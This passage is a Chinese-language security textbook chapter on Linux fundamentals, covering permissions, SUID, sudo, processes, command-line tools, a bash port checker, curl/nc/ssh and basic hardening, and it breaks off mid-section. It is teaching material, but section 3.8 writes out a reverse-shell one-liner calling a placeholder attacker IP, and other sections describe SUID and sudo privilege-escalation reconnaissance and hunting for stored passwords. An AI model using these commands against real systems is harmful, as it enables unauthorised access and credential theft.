## 3.1 為什麼資安以 Linux 為主

新手常問:「我平常用 Windows / Mac,為什麼學資安非得碰 Linux?」這問題很合理,答案有三層。

### 一、工具生態長在 Linux 上

資安圈絕大多數的經典工具——`nmap`(掃描,第 05 章)、`metasploit`(漏洞利用,第 14 章)、`hydra`、`john`、`hashcat`(密碼破解,第 15 章)、`sqlmap`(第 07 章)、`nikto`、`gobuster`——**第一手支援、最完整的功能、最多的文件與範例,都在 Linux 上**。專門為攻防打造的發行版 **Kali Linux** 與 **Parrot OS** 更是把上千個工具預先裝好、調好,你開機就能用(第 01 章我們就是裝 Kali 當攻擊機)。你當然可以在 Windows 上硬跑某些工具,但那是逆流而上,遇到問題也少人能幫。

### 二、你要攻擊的目標,大半是 Linux

打開任何一份市佔統計:全球對外服務的**網頁伺服器、雲端主機、容器、IoT 裝置**,絕大多數跑的是 Linux。你做滲透測試,拿到的那台主機、那個 shell,基本上就是在跟 Linux 打交道。**你不懂 Linux,拿到 shell 也不知道下一步該敲什麼**——這是新手最常見的窘境:好不容易利用漏洞拿到立足點,結果對著游標發呆。

### 三、開源,所以可掌控、可拆解

Linux 是開源的,從核心到工具,原始碼都攤在陽光下。這對資安有兩個意義:

- **防守方**能審視程式碼、確認沒有後門、依需求客製加固(第 19 章)。
- **攻擊方**能研究原始碼找漏洞、理解某個服務「為什麼會這樣反應」,而不是對著黑箱瞎猜。

相對地,閉源系統你只能相信廠商「說」它安全。**資安講究「可驗證」,而開源正是可驗證的前提。**

> **心智模型**:如果把攻防想成一場在特定球場進行的比賽,那 Linux 就是**主球場**。你可以在別的場地熱身,但正式比賽在這裡打。與其之後手忙腳亂,不如現在就把場地熟悉透。

**給你的實務提醒**:別想「一次把 Linux 全部學完」——那是系統管理員的路。你要的是**攻防視角的 Linux**:檔案在哪、權限怎麼看、程序怎麼查、指令怎麼串。這一章給的就是這條精簡路線。

## 3.2 檔案系統結構與資安重要路徑

Linux 有一句名言:**「一切皆檔案(Everything is a file)」**。硬碟是檔案、鍵盤是檔案、正在跑的程序資訊也是檔案。整個系統是一棵從根目錄 `/` 長出來的樹,遵循 **FHS(檔案系統階層標準)** 這套約定,所以你在任何一台 Linux 上,都能預期某類東西放在某個位置。

對攻擊者而言,這棵樹裡有幾個「一定要去翻」的路徑。先看全景表,再逐一說明它們對攻擊者的意義:

| 路徑 | 是什麼 | 對攻擊者的意義 |
|------|--------|----------------|
| `/etc/passwd` | 使用者帳號清單 | **列舉系統有哪些帳號**,幾乎人人可讀 |
| `/etc/shadow` | 密碼雜湊 | 拿到就能離線破密碼(第 15 章),只有 root 可讀 |
| `/var/log/` | 各種日誌 | 攻擊者想清除足跡,防禦者靠它抓入侵 |
| `/home/` | 一般使用者家目錄 | 找設定檔、金鑰、`.bash_history`、原始碼 |
| `/root/` | root 的家目錄 | 提權成功後的「藏寶庫」 |
| `/tmp`、`/dev/shm` | 暫存區,通常人人可寫 | **上傳工具、落腳、放 payload 的好地方** |
| `/proc/` | 核心與程序的虛擬視窗 | 挖程序、記憶體、環境變數、網路資訊 |
| `/etc/cron*` | 排程任務設定 | 找可被綁架的排程(提權常見手法) |

### `/etc/passwd`——帳號名冊,人人可讀

別被名字騙了,現代系統的 `/etc/passwd` **不放密碼**,而是帳號基本資料。每一行一個帳號,用冒號分隔:

```bash
# 印出 passwd 的其中一行,看懂七個欄位
cat /etc/passwd            # 讀出整個帳號清單
# root:x:0:0:root:/root:/bin/bash
#  │   │ │ │  │     │       └ 登入 shell(/usr/sbin/nologin 代表這帳號不能互動登入)
#  │   │ │ │  │     └ 家目錄
#  │   │ │ │  └ 描述欄
#  │   │ │ └ GID(所屬主要群組 ID)
#  │   │ └ UID(使用者 ID,0 = root,最高權限)
#  │   └ 密碼欄位,x 代表「密碼雜湊藏在 /etc/shadow」
#  └ 帳號名稱
```

**資安用途**:這是攻擊者做「使用者列舉」的第一站。看到 `UID=0` 的帳號就是有 root 權限的(正常只該有 `root` 一個,若出現第二個 UID=0 帳號,極可能是後門)。看哪些帳號的 shell 是 `/bin/bash`(能互動登入、值得嘗試爆破),哪些是 `/usr/sbin/nologin`(服務帳號,通常不能登)。

### `/etc/shadow`——真正的密碼,只有 root 能碰

密碼雜湊被搬到這裡,並限制**只有 root 可讀**——這是很重要的權限設計。

```bash
# 一般使用者讀會被拒絕
cat /etc/shadow            # 一般權限:Permission denied
# root:$6$xyz...$abc...:19700:0:99999:7:::
#       └ $6$ 開頭代表 SHA-512 雜湊,後面是加鹽的密碼雜湊
```

**資安用途**:如果你已經提權到 root、或某個設定失誤讓 shadow 變成可讀,**把它抓下來就能離線暴力破解密碼**(第 15 章會實作 `john` / `hashcat`)。所以「能不能讀到 shadow」本身就是一個提權里程碑。防禦者則要確保它的權限永遠是 `640` 且屬 root。

### `/var/log/`——足跡的兩面刃

系統與服務的日誌都寫在這:`/var/log/auth.log`(登入紀錄)、`/var/log/syslog`、`/var/log/nginx/access.log`(網頁存取)等。

- **攻擊者視角**:入侵後常想「清除足跡」,刪或改這裡的紀錄(但這動作本身也會留痕,而且成熟環境會把 log 即時送到別台主機,第 20 章)。
- **防禦者視角**:這是抓入侵的第一手證據——異常登入、大量失敗嘗試、可疑請求全在這(第 20、21 章)。

### `/home/`、`/root/`——藏寶庫

使用者的家目錄常藏著意想不到的東西:設定檔、`.ssh/` 裡的**私鑰**、`.bash_history`(這個人打過的所有指令,可能含明碼密碼)、專案原始碼與其中的 API 金鑰。拿到一個立足點後,`/home` 幾乎是必翻的地方,而 `/root` 是提權成功後的終極目標。

### `/tmp`、`/dev/shm`——攻擊者的落腳處

這些目錄通常設成「人人可寫」。對只有低權限的攻擊者來說,這是**少數能寫入檔案的地方**,所以常拿來:下載並存放攻擊工具、丟提權腳本、暫存竊得的資料。防禦者若把 `/tmp` 掛載成 `noexec`(不可執行),就能擋掉一部分這類手法(第 19、3.10 節)。

### `/proc/`——系統的透視窗

`/proc` 不是真的硬碟目錄,而是核心即時產生的虛擬檔案,能看到正在跑的一切:

```bash
cat /proc/version          # 看核心版本 → 對照有沒有已知的提權漏洞(第 16 章關鍵!)
cat /proc/1234/cmdline     # 看 PID 1234 是用什麼完整指令啟動的(可能含密碼參數)
ls -l /proc/1234/exe       # 看該程序對應的執行檔在哪
cat /proc/1234/environ     # 看該程序的環境變數(有時藏著密碼、token)
```

**資安用途**:`cat /proc/version` 是提權偵察的經典第一步——知道核心版本,就能上網查「這版本有沒有現成的 kernel exploit」。

> **心智模型**:剛拿到一台陌生 Linux,就像走進一間陌生的房子。上面這幾個路徑,就是你進門要先看的地方:名冊在哪(`/etc/passwd`)、保險箱在哪(`/etc/shadow`、`.ssh`)、監視器紀錄在哪(`/var/log`)、哪裡能放東西(`/tmp`)。熟門熟路的人,五分鐘就摸清一間房。

## 3.3 【重要】權限模型:攻防的核心地基

這一節是全章最關鍵的觀念,務必弄懂。Linux 的權限模型既是它的安全基石,也是攻擊者提權的主要突破口。

### rwx 與三種身分

每個檔案/目錄都對三種身分,各自規定三種權限:

- **三種身分**:`user`(擁有者 u)、`group`(所屬群組 g)、`other`(其他所有人 o)。
- **三種權限**:`r`(讀 read)、`w`(寫 write)、`x`(執行 execute)。

用 `ls -l` 就能看到:

```bash
ls -l secret.sh
# -rwxr-xr--  1 alice  dev   220  Jul  3 10:00  secret.sh
#  │└┬┘└┬┘└┬┘    └┬─┘  └┬┘
#  │ u  g  o      擁有者 所屬群組
#  │ │  │  └ other(其他人):r-- → 只能讀
#  │ │  └ group(dev 群組):r-x → 能讀、能執行,不能寫
#  │ └ user(alice):rwx → 能讀、能寫、能執行
#  └ 檔案類型:- 是一般檔案,d 是目錄,l 是符號連結
```

> **心智模型**:把權限想成**三串鑰匙**。你(擁有者)一串、你的團隊(群組)一串、其他所有人一串。每一串鑰匙能開三道鎖:看(r)、改(w)、執行(x)。攻擊者做的事,本質上就是「想辦法拿到不屬於我的那串鑰匙」。

**目錄的 rwx 意義不太一樣**,新手常搞錯:對目錄而言,`r` 是「能不能列出裡面有什麼」、`w` 是「能不能在裡面新增/刪除檔案」、`x` 是「能不能進入(cd)並存取裡面的檔案」。所以一個目錄若沒有 `x`,就算有 `r` 你也進不去。

### chmod:改權限的兩種寫法

`chmod` 用來修改權限,有「數字法」與「符號法」兩種:

**數字(八進位)表示法**——把 rwx 當成二進位:`r=4`、`w=2`、`x=1`,相加就是該身分的數字。

```bash
chmod 754 secret.sh        # 設定權限為 rwxr-xr--
#      │└ other = 4      = r--(只讀)
#      │ └ group = 5 = 4+1 = r-x(讀 + 執行)
#      └ user  = 7 = 4+2+1 = rwx(讀寫執行)

chmod 600 id_rsa           # 私鑰標準權限:rw-------(只有自己能讀寫)
chmod 777 upload/          # 人人可讀寫執行 → 極危險,新手常犯的大錯!
```

> **新手誤區**:很多人遇到「權限不足」的錯誤,就直接 `chmod 777` 把問題「解掉」。這等於**把家門大開讓所有人隨意進出**。在資安上,`777` 的檔案/目錄是攻擊者的最愛——尤其是可寫的腳本或設定檔,可能直接變成提權管道。**能給最小權限,就別給多。**

**符號表示法**——用 `u/g/o/a` 搭配 `+/-/=` 與 `rwx`:

```bash
chmod u+x deploy.sh        # 給「擁有者」加上執行權限(+ 是增加)
chmod o-r secret.txt       # 拿掉「其他人」的讀取權限(- 是移除)
chmod g=rx script.sh       # 把「群組」權限直接設為 r-x(= 是設定為)
chmod a+r public.txt       # a = all(所有身分)都加上讀取
```

### chown:改擁有者

`chown` 改變檔案的擁有者與群組:

```bash
chown alice   file.txt         # 把 file.txt 的擁有者改成 alice
chown alice:dev file.txt       # 擁有者改 alice、群組改 dev
chown -R www-data:www-data /var/www   # -R 遞迴,把整個網站目錄改給網頁伺服器帳號
```

**注意**:一般使用者不能把自己的檔案送給別人(否則會有安全問題),`chown` 幾乎都要 root 權限。這也是為什麼「誰能執行 chown」本身就值得留意。

### SUID / SGID:提權的頭號關鍵(伏筆第 16 章)

這是本節、甚至整個提權主題(第 16 章)最重要的觀念,請專心看。

一般情況下,你執行一支程式,那支程式就用**你的權限**在跑。但有些程式天生需要更高權限才能運作——例如 `passwd`(改密碼)必須寫入只有 root 能碰的 `/etc/shadow`。於是 Linux 設計了 **SUID(Set User ID)** 位元:**當一支執行檔設了 SUID,任何人執行它時,都會用「檔案擁有者」的權限來跑,而不是執行者自己的權限。**

```bash
ls -l /usr/bin/passwd
# -rwsr-xr-x  1 root  root  ...  /usr/bin/passwd
#     └ 注意這個 s(不是 x)!就是 SUID 位元
#       意思:誰執行 passwd,都會「暫時以 root 身分」執行它
```

那個 `s`(在 user 的執行位)就是 SUID 標記。**SGID(Set Group ID)** 同理,只是換成「以檔案的群組身分執行」,顯示在 group 的執行位。

**為什麼這是提權關鍵?** 想像一下:如果某支 SUID 程式的擁有者是 root,而這支程式**有漏洞、或能被誘導去執行別的指令**,那攻擊者就能借它的「root 身分」執行任意命令——瞬間從低權限使用者變成 root。像 `find`、`vim`、`bash`、`nmap` 這類程式若被錯誤地設成 SUID root,幾乎等於把 root 拱手送人(有個專門網站 GTFOBins 就在收錄「哪些程式一旦是 SUID 就能拿來提權」)。

**攻擊者的例行動作:找出系統上所有 SUID 檔案。**

```bash
find / -perm -4000 -type f 2>/dev/null
#  │  │      │        │       └ 把「權限不足」的錯誤訊息丟掉,畫面才乾淨
#  │  │      │        └ 只找檔案(不找目錄)
#  │  │      └ -4000:找「有設 SUID 位元」的檔案(4 就是 SUID)
#  │  └ 從根目錄 / 開始整台掃
#  └ find:遞迴搜尋工具

# 找 SGID 檔案則用 -perm -2000;想一次找兩者可用 -perm -6000
find / -perm -2000 -type f 2>/dev/null   # 找 SGID 檔案
```

跑完後,把清單裡「不尋常」的項目(不該是 SUID 的程式,或非系統標準的自製程式)挑出來,拿去 GTFOBins 對照——這是第 16 章提權的標準開場。

> **攻防對照**:**SUID 是攻擊者的最愛,也是防禦者的稽核重點。** 攻擊方:拿到低權限 shell 後第一件事就是 `find / -perm -4000` 掃 SUID 找提權破口。防禦方:應該**定期稽核 SUID/SGID 清單**,把清單存檔當基準線(baseline),之後定期比對——一旦冒出「原本沒有」的 SUID 檔案,極可能是攻擊者種的後門或提權跳板。這個攻防對照,第 16 章(提權)與第 19 章(加固)會再深入。

## 3.4 使用者與帳號:root 與 sudo 的世界

### root:那個什麼都能做的帳號

`root`(UID=0)是 Linux 的超級使用者,**權限不受檔案權限限制**——它能讀寫任何檔案、殺任何程序、改任何設定。攻防的許多「終局」就是「拿到 root」。正因為它太強大,現代 Linux 的安全實務是:**平常用一般帳號,需要時才「借用」root 權限。**

### sudo:借用 root 權限的正規機制

`sudo`(superuser do)讓授權過的一般使用者,以 root(或指定身分)執行**單一指令**,而不必真的登入成 root。

```bash
sudo apt update            # 以 root 身分執行 apt update,會要你輸入「自己的」密碼
sudo -l                    # 【資安關鍵】列出「目前這個帳號被允許用 sudo 跑哪些指令」
sudo -u www-data whoami    # 以 www-data 這個身分執行指令(不一定要是 root)
```

`sudo -l` 是**提權偵察的黃金指令**。它會告訴你這個帳號能用 sudo 跑什麼:

- 如果顯示 `(ALL) ALL`,代表能以 root 跑任何東西——直接 `sudo su` 就變 root。
- 如果只允許某支特定程式(例如 `(root) NOPASSWD: /usr/bin/vim`),而那支程式又能「跳出去執行別的指令」(vim 就可以),那一樣能提權。GTFOBins 也收錄了這類「sudo 提權」清單。

### su:直接切換身分

`su`(substitute user)是直接「變成另一個使用者」:

```bash
su -                       # 切換成 root(需要 root 的密碼),- 會載入 root 的完整環境
su - alice                 # 切換成 alice(需要 alice 的密碼)
```

**`su` 與 `sudo` 的差別**:`su root` 要輸入 **root 的密碼**;`sudo` 要輸入**你自己的密碼**。多人管理的環境偏好 sudo,因為不必把 root 密碼告訴大家,而且每次 sudo 都會留下紀錄(`/var/log/auth.log`),誰做了什麼查得到——這對第 21 章的事件回應很重要。

### /etc/sudoers:誰能 sudo 的規則書

`sudo` 的授權規則寫在 `/etc/sudoers`(以及 `/etc/sudoers.d/` 下的檔案)。**編輯它一定要用 `visudo`**,因為 `visudo` 會在存檔前檢查語法——語法寫錯又沒人能 sudo,你可能就把自己鎖在門外了。

```bash
sudo visudo                # 正確的編輯方式,存檔前會做語法檢查
# 檔案裡的規則長這樣:
# root    ALL=(ALL:ALL) ALL          → root 能對所有主機、以任何身分、跑任何指令
# alice   ALL=(ALL) NOPASSWD: ALL    → alice 免密碼就能 sudo 任何指令(方便但危險)
# %dev    ALL=(root) /usr/bin/systemctl restart nginx   → dev 群組只能重啟 nginx
```

**資安重點**:`sudoers` 設定不當是常見的提權破口。像 `NOPASSWD: ALL` 這種寬鬆規則,或允許某個「能跳脫」的程式(編輯器、直譯器、`find`、`tar` 等),都可能被攻擊者拿來從一般使用者變 root。防禦方要遵守**最小權限原則**——只授權「完成工作真正需要」的那幾條指令。

> **心智模型**:root 是「有萬能鑰匙的大樓管理員」。sudo 不是把萬能鑰匙給你,而是「你刷自己的員工卡、在紀錄簿簽個名,管理員就替你開這一次特定的門」。`/etc/sudoers` 就是那本「誰能開哪些門」的規則書。攻擊者最愛翻的,就是規則書裡寫得太寬鬆的那幾條。

## 3.5 程序與服務:誰在跑、誰在聽

拿到一台主機,除了看檔案,你還想知道「**它現在正在跑什麼、對外開了哪些門**」。

### ps / top:看正在跑的程序

```bash
ps aux                     # 列出「所有使用者」的「所有程序」,含完整指令
#  │└ a:所有使用者的程序、u:顯示擁有者、x:含沒有終端機的背景程序
#  └ 輸出欄位有:USER(誰跑的)、PID(程序編號)、%CPU、%MEM、COMMAND(完整指令)

ps aux | grep nginx        # 只看跟 nginx 有關的程序(配合管線,3.6 節)
top                        # 即時動態監看,按 CPU/記憶體排序(按 q 離開)
```

**資安用途**:`ps aux` 能看到「有沒有可疑程序」(挖礦程式、反向 shell、名字偽裝成系統程序的惡意軟體),也能在 `COMMAND` 欄看到**啟動指令裡不小心帶的密碼**(例如 `mysql -u root -pMyPassw0rd`——密碼直接寫在指令列,`ps` 就看得到,這是常見疏失)。防禦者靠它抓異常程序,攻擊者靠它找情報與破口。

### systemctl:管理服務

現代 Linux 用 **systemd** 管理開機啟動的服務(daemon),操作介面是 `systemctl`:

```bash
systemctl status ssh       # 看 ssh 服務的狀態(是否在跑、PID、最近的 log)
systemctl list-units --type=service --state=running   # 列出所有「正在跑」的服務
systemctl stop  apache2    # 停止 apache2 服務
systemctl disable apache2  # 取消 apache2 的「開機自動啟動」(加固常用,3.10 節)
```

**資安用途**:攻擊者看「開了哪些服務」等於看「有哪些攻擊面」(第 00 章的攻擊面思維);防禦者則反過來,**把用不到的服務關掉、取消開機啟動**,以縮小攻擊面(3.10、第 19 章)。

### ss / netstat:看本機開了哪些 port、誰在聽

這是攻防都極常用的技能:**列出本機正在監聽(listening)的網路連接埠,以及是「哪個程序」在聽。** 新工具是 `ss`,舊工具是 `netstat`(功能類似,新系統推薦 `ss`)。

```bash
ss -tlnp
#  │└┬┘└ p:顯示是「哪個程序(PID/程式名)」在監聽 ← 資安最想知道的!
#  │ ││ n:port 用數字顯示(不做名稱解析,較快)
#  │ │└ l:只看 listening(正在等連線)的
#  │ └ t:只看 TCP
#  └ ss:socket statistics
# 輸出例:LISTEN 0 128 0.0.0.0:22 ... users:(("sshd",pid=812,fd=3))
#         代表 sshd(PID 812)正在所有網卡的 22 埠等待連線

netstat -tlnp              # 舊系統的等價指令(參數幾乎一樣)
ss -tunp                   # 想連 UDP 一起看:把 l 換 u,或加 u(t=TCP、u=UDP)
```

> **心智模型**:`ss -tlnp` 回答的是「**這棟房子開了哪幾扇對外的門,每扇門後站著誰**」。攻擊者從外面掃描(第 05 章 nmap)只知道「哪些門開著」;但當你人已經在屋內(拿到 shell),`ss -tlnp` 讓你連「門後是哪個程序、PID 多少」都一清二楚——這是「內部視角」比「外部掃描」強大的地方,常能發現只綁在 `127.0.0.1`(本機才連得到)的隱藏服務,那往往是提權或橫向移動的好目標。

## 3.6 命令列生存技能:把小工具串成瑞士刀

Unix 哲學是「**每支程式只做好一件事,再用管線把它們串起來**」。這一節的工具單看很陽春,一旦組合起來,就是你在 log、掃描結果、抓取資料裡「大海撈針」的利器。

### 管線 `|` 與重導向 `>` `>>` `2>`

```bash
cat access.log | grep "404"          # 把 cat 的輸出「餵給」grep → 只留含 404 的行
grep "admin" users.txt > result.txt  # >  把輸出寫到檔案(覆蓋原內容)
grep "admin" users.txt >> result.txt # >> 把輸出「附加」到檔案結尾(不覆蓋)
nmap 10.0.0.1 2> errors.txt          # 2> 把「錯誤訊息」單獨導到檔案
find / -perm -4000 2>/dev/null       # 2>/dev/null:把錯誤丟進垃圾桶(眼不見為淨)
```

- `|`(管線):把左邊指令的輸出,當成右邊指令的輸入——這是串工具的黏著劑。
- `>` / `>>`:把輸出存檔,前者覆蓋、後者附加。
- `2>`:標準錯誤(stderr)有自己的通道(編號 2),可單獨處理;`2>/dev/null` 是「安靜模式」的經典寫法。

### grep:文字搜尋主力(含正則)

```bash
grep "Failed password" /var/log/auth.log      # 撈出所有登入失敗的紀錄
grep -i "error" app.log                        # -i:不分大小寫
grep -r "password" /var/www/                   # -r:遞迴搜整個目錄(找原始碼裡的明碼密碼!)
grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" log      # -E:用正則,這條抓出所有 IP 位址格式
grep -c "404" access.log                       # -c:只回報「符合的行數」
```

`-E` 打開延伸正規表達式(regex)。上面那條 `([0-9]{1,3}\.){3}[0-9]{1,3}` 就是「三段數字加點、再一段數字」——IPv4 的樣式,是從日誌裡撈 IP 的常用寫法。

### awk / sed / cut:切割與改寫

```bash
# awk:按欄位處理。access.log 第 1 欄常是來源 IP
awk '{print $1}' access.log            # 只印出每行的第 1 欄(來源 IP)
awk -F: '{print $1}' /etc/passwd       # -F: 用冒號當分隔 → 只印帳號名

# cut:更輕量的切欄位
cut -d: -f1 /etc/passwd                # -d 分隔符、-f1 取第 1 欄(同上,取帳號)

# sed:串流編輯(取代、刪除)
sed 's/admin/REDACTED/g' users.txt     # 把所有 admin 換成 REDACTED(s///g = 全域取代)
```

### sort / uniq:排序與去重複統計

```bash
sort ips.txt | uniq            # 先排序,再把「連續的重複行」合併(uniq 需先 sort)
sort ips.txt | uniq -c         # -c:順便數每個出現幾次
```

### 綜合實戰:從 log 揪出可疑 IP

單看每個工具很無聊,現在把它們串起來,做一件真實的事——**從網頁日誌裡找出「請求次數最多的前 10 個 IP」**(可能是掃描或暴力破解的來源):

```bash
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -10
#  │                 │        │        │         │
#  │                 │        │        │         └ head -10:只取前 10 行
#  │                 │        │        └ sort -rn:依「次數」由大到小排(r=反向、n=數字)
#  │                 │        └ uniq -c:把重複 IP 合併並數出各自次數
#  │                 └ sort:先排序(uniq 才能正確合併相同 IP)
#  └ awk '{print $1}':抽出每行的第 1 欄(來源 IP)
```

再進一步,**從登入紀錄找出「爆破 SSH 的攻擊者 IP」**(這條藍隊天天用):

```bash
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
#      └ 先撈出所有登入失敗的行
#                                          └ 取倒數第 4 欄(auth.log 裡通常是來源 IP 的位置)
#                                                              └ 排序、計次、由多到少
# 跑出來若某個 IP 失敗上千次,幾乎可斷定是暴力破解 → 該封鎖它(第 20、21 章)
```

> **心智模型**:別想著找一個「超強工具」一次解決。命令列的威力來自**組合**——`grep` 先粗篩、`awk`/`cut` 切出要的欄位、`sort`+`uniq -c` 統計、`head` 取前幾名。就像把螺絲起子、鉗子、剪刀組成一把瑞士刀。這種「串接思維」是命令列高手與新手最大的差距。

## 3.7 寫 bash 腳本:把重複的事自動化

當你要對「一整串目標」做同樣的事(例如逐一檢查一批 IP),手動一個個敲太慢,這時就寫個 bash 腳本用迴圈跑。下面是一個實用的小範例:**讀入一個 IP 清單,逐一檢查它們的 22 埠(SSH)有沒有開**。

```bash
#!/bin/bash
# ↑ shebang:告訴系統用 /bin/bash 來執行這個腳本

# ── 設定要檢查的埠 ──
PORT=22                                  # 想探測的埠,這裡設 SSH 的 22

# ── 逐行讀取 ips.txt 裡的每個 IP ──
while read -r ip; do                     # while read:一行一行讀,每行存進變數 ip
    # 用 timeout 限制 2 秒,避免主機不通時卡住;結果丟進垃圾桶只看成敗
    if timeout 2 bash -c "echo > /dev/tcp/$ip/$PORT" 2>/dev/null; then
        # /dev/tcp/IP/PORT 是 bash 內建的「試著連這個 TCP 埠」魔法寫法
        echo "[+] $ip 的 $PORT 埠是開的"   # 連得上 → 埠開著
    else
        echo "[-] $ip 的 $PORT 埠關閉或無回應"
    fi
done < ips.txt                           # < ips.txt:把檔案內容餵給整個 while 迴圈
```

用法與逐步說明:

```bash
# 1. 先準備一個 IP 清單(每行一個),放進 ips.txt
# 2. 給腳本執行權限(回顧 3.3 的 chmod!)
chmod +x portcheck.sh
# 3. 執行
./portcheck.sh
# 輸出範例:
# [+] 10.0.0.5 的 22 埠是開的
# [-] 10.0.0.6 的 22 埠關閉或無回應
```

**這在資安場景有什麼用**:偵察階段(第 05 章)你常要對一批目標做同樣的探測。雖然 `nmap` 這類專業工具更強,但**你不一定隨時有工具**——拿到一台功能受限的主機時,能用內建的 bash 手刻一個簡易掃描器,是很實用的生存技能。這也帶出一個重點:**`/dev/tcp/IP/PORT` 是 bash 的內建功能,不需要裝任何工具就能做網路連線**,這在「工具被拔光」的受限環境裡是救命招。

> **新手誤區**:別把腳本寫得又臭又長才「開始測試」。先寫最小可跑版本(先讓迴圈能印出每個 IP),確認對了再加功能。資安工作跟寫程式一樣,**小步前進、隨時驗證**,才不會除錯到懷疑人生。

## 3.8 網路瑞士刀:curl、wget、nc、ssh

這幾支是攻防時「跟網路互動」最常用的工具,務必練到熟。

### curl:打 API、看 header 的萬用客戶端

`curl` 能發各種 HTTP 請求,是測 Web(第 06–13 章)的主力:

```bash
curl -I https://example.com               # -I:只拿「回應標頭(header)」,看伺服器資訊
#   常能看到 Server: nginx/1.18、X-Powered-By: PHP/7.4 → 洩漏版本 → 找對應漏洞
curl -X POST -d "user=admin&pass=1234" https://site/login   # 送 POST,-d 帶表單資料
curl -H "Authorization: Bearer TOKEN" https://api/data       # -H 自訂標頭(帶 token 打 API)
curl -x http://127.0.0.1:8080 https://site   # -x 走代理 → 把流量導進 Burp Suite 檢視(第 06 章)
curl -s -o out.html https://site          # -s 安靜、-o 存檔
```

**資安用途**:`curl -I` 看 header 是被動偵察的基本功(第 04 章);`-X`、`-d`、`-H` 讓你**繞過瀏覽器、直接對後端 API 發任意請求**——回顧第 00 章「所有前端驗證對攻擊者無效」,curl 正是實踐這句話的工具。

### wget:抓檔案、鏡像網站

```bash
wget https://site/tool.tar.gz             # 下載單一檔案
wget -r https://site/                     # -r 遞迴抓整個網站(離線分析)
```

`curl` 偏「跟 API 互動」,`wget` 偏「把檔案抓下來」,兩者常一起裝。拿到 shell 後,`wget`/`curl` 也常拿來「從自己的伺服器把攻擊工具拉進目標主機」。

### nc(netcat):網路界的瑞士刀

`nc` 能手動建立 TCP/UDP 連線,監聽或連出,是理解網路連線本質的最佳教具:

```bash
nc -lvnp 4444              # 監聽模式:在本機 4444 埠等連線
#  │└┬┘└ p 4444:指定埠
#  │ ││ n:不做 DNS 解析
#  │ │└ v:verbose,顯示連線細節
#  │ └ l:listen(監聽)
#  └ 這台就變成「伺服器」,等別人連進來

nc 10.0.0.5 4444           # 連線模式:主動連到對方的 4444 埠
nc -zv 10.0.0.5 20-25      # -z 只掃不送資料、掃 20–25 埠 → 簡易埠掃描
```

**反向 shell(reverse shell)的概念**——這是後滲透(第 16 章)的核心手法,先建立觀念:

```
① 攻擊者在自己的機器監聽:      nc -lvnp 4444
② 想辦法讓「被害主機」主動連回來,並把它的 shell 交出來:
   (在被害主機上執行,例如透過某個漏洞)
   bash -i >& /dev/tcp/攻擊者IP/4444 0>&1
③ 於是攻擊者的 nc 視窗,就拿到了被害主機的命令列控制權
```

> **心智模型**:為什麼叫「反向(reverse)」?正常你連伺服器(你→它);反向 shell 是**反過來讓被害主機主動連向攻擊者**(它→你)。為什麼要反過來?因為防火牆通常擋「外面連進來」,卻放行「裡面連出去」——反向 shell 正是鑽這個空子。理解這點,你就懂了第 19 章「出向流量也要管控(egress filtering)」為什麼重要。

### ssh / scp:遠端登入與傳檔

```bash
ssh alice@10.0.0.5                        # 用 alice 帳號 SSH 登入遠端主機
ssh -i id_rsa alice@10.0.0.5              # -i 用私鑰登入(還記得 3.2 提的 .ssh 私鑰嗎)
ssh -L 8080:127.0.0.1:80 alice@10.0.0.5   # -L 本機轉發:把遠端只綁 127.0.0.1 的服務拉到本機
scp file.txt alice@10.0.0.5:/tmp/         # 把本機檔案複製到遠端(基於 SSH,安全加密)
scp alice@10.0.0.5:/etc/passwd .          # 反向:把遠端檔案抓回本機
```

**資安用途**:SSH 是登入 Linux 伺服器最常見的方式,也因此是**暴力破解的頭號目標**(3.6 節那條 log 分析就在抓這個)。而 `ssh -L`(埠轉發 / tunneling)能把「只綁在目標本機 `127.0.0.1`、外面連不到」的內部服務,透過 SSH 通道拉到你本機來打——這是橫向移動與存取內網服務的常用技巧(第 16 章)。

## 3.9 套件與工具安裝:方便,但別亂裝

在 Linux 上裝軟體,主要有兩條路,各有資安考量。

### apt:Debian/Ubuntu/Kali 的套件管理器

```bash
sudo apt update                # 更新「套件清單」(問各來源:現在有哪些新版本?)
sudo apt upgrade               # 依清單把已裝的套件升級到新版(補漏洞!)
sudo apt install nmap          # 安裝 nmap
sudo apt remove apache2        # 移除套件(加固時清掉用不到的,3.10 節)
apt list --installed           # 列出已安裝的所有套件(盤點資產)
```

套件管理器的好處是**自動處理相依套件、且來自簽章驗證過的官方軟體庫**,相對安全。`apt update && apt upgrade` 定期跑,是防禦面「修補已知漏洞」最基本也最有效的動作(很多入侵就是打「沒更新的舊版服務」)。

### 從原始碼編譯:彈性最大,信任要自己扛

有些工具官方庫沒有,得抓原始碼自己編:

```bash
git clone https://github.com/some/tool.git   # 抓原始碼
cd tool
./configure                    # 檢查環境、產生編譯設定
make                           # 依設定編譯出執行檔
sudo make install              # 安裝到系統路徑
```

### 來源可信度:資安人尤其要小心

這一點對資安從業者是**雙重重要**:

- **你裝的工具本身可能有後門。** 從不明來源、隨手 google 到的「破解版工具」「一鍵腳本」,可能夾帶惡意程式碼——你以為在攻擊別人,其實自己先被種了後門。
- **`curl ... | sudo bash` 這種一行安裝法要格外警覺。** 它等於「把遠端一段程式抓下來,直接用 root 執行」——你完全沒機會看它做了什麼。至少先 `curl` 下來讀過再執行。

> **心智模型**:安裝軟體 = **把「執行任意程式碼的權力」交給對方**。官方套件庫像「有品管的超市」,原始碼自編像「自己買菜自己煮(看得到食材但要自己判斷新不新鮮)」,而網路上來路不明的腳本像「路邊陌生人請你吃的東西」。資安人比誰都該懂:**信任是要驗證的,不是預設的**(呼應第 00 章的信任邊界)。

## 3.10 防禦視角:Linux 基礎加固

前面多從攻擊者角度看 Linux,這一節換防禦者的帽子。加固(hardening)的核心思想就一句:**縮小攻擊面、貫徹最小權限。** 這裡給你四個最有感的基礎動作,對應前面各節,第 19 章會更完整。

### 一、關掉用不到的服務(縮小攻擊面)

每一個對外監聽的服務,都是一扇可能被攻破的門(第 00 章攻擊面思維)。

```bash
ss -tlnp                       # 先盤點:本機到底開了哪些埠、哪個程序在聽(3.5 節)
systemctl disable --now apache2   # 用不到的服務,停掉並取消開機啟動(3.5 節)
```

原則:**跑起來的服務越少,能被打的點越少。** 一台只該當資料庫的主機,就不該開著網頁伺服器和 FTP。

### 二、最小權限:別再 chmod 777

```bash
find / -perm -0002 -type f 2>/dev/null   # 找出「其他人可寫(world-writable)」的檔案 → 高風險
